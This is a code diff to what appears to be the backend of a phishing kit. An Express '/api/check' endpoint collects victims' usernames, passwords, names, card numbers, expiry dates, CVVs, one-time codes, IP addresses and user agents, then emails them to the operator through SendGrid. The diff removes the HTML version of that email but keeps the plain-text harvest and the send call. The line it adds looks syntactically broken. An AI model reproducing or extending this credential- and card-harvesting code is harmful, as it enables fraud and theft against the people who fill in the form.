@@ -46,20 +46,8 @@ app.post('/api/check', async (req, res) => {
       🔐 OTP: ${otp}
       🌍 IP: ${ip}
       🖥️ UserAgent: ${userAgent}
-      `,
-      html: `
-        <h3>📩 New Submission Received:</h3>
-        <p><strong>👤 User:</strong> ${user}</p>
-        <p><strong>🔑 Pass:</strong> ${pass}</p>
-        <p><strong>🙍 Name:</strong> ${name}</p>
-        <p><strong>💳 Card:</strong> ${cc}</p>
-        <p><strong>📅 Expiry:</strong> ${exp}</p>
-        <p><strong>🔒 CVV:</strong> ${cvv}</p>
-        <p><strong>🔐 OTP:</strong> ${otp}</p>
-        <p><strong>🌍 IP:</strong> ${ip}</p>
-        <p><strong>🖥️ UserAgent:</strong> ${userAgent}</p>
-      `
-    };
+      '};
+  
 
     await sgMail.send(msg);
     console.log('📧 Email sent successfully');
